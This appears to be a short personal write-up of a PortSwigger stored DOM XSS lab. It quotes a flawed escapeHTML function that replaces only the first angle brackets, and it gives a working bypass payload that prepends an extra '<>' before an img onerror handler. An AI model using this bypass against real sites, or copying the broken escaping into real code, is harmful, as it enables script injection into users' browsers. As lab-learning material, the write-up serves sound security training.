# Lab: Stored DOM XSS
# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

```bash
# Open view post. Refresh the page and check it with Burp Suite target.

#Check loadCommentsWithVulnerableEscapeHtml.js from resources js.

xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

```

```bash
# Let's try to create comments
<h1> Hello </h1>
# The comment i could see was <h1> Hello It removes last </h1> but keeps first.

<><img src=0 onerror=alert()>

# JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence.
# We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment.
# These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.

```
